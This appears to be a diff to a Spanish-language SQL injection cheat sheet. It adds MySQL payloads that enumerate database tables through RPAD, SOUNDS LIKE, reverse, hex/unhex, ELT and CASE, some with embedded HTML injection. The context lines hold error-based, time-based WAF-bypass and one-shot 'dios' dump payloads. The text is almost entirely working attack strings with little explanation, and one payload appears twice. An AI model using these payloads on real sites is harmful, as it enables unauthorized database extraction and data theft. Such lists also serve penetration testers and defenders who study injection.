@@ -793,9 +793,38 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 +union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+
 
-
-
 ```
+
+
+#### Inyecciónes sql usando funciones sql
+
+### Sql inyection payload usando la función RPAD y SOUNDS LIKE 
+
+`SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()`
+
+### Sql inyection payload usando upper + reverse + right + sounds like para extraer información  
+
+`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`
+
+### Sql inyection usando elt, doble Reverse, hex y unhex
+
+`Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables`
+
+### Sql inyection case
+
+`SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables`
+
+### Sql inyection payload usando upper + reverse + right + sounds like
+
+`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`
+
+### SQL injection usando doble reverse + right + if statement + HTML injection
+
+`SELECT reverse(reverse(right(if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>'),100))) from information_schema.tables`
+
+### Sql inyection usando las funciones HEX-UNHEX
+
+`SELECT UNHEX(HEX(table_name))from information_schema.tables`
 
 ### Inyección sql tipo error based usando Extractvalue
 
@@ -813,7 +842,9 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 `-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`
 
-### Sql inyection + dios sql
+
+
+#### Sql inyection + dios sql
 
 ```
 /*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
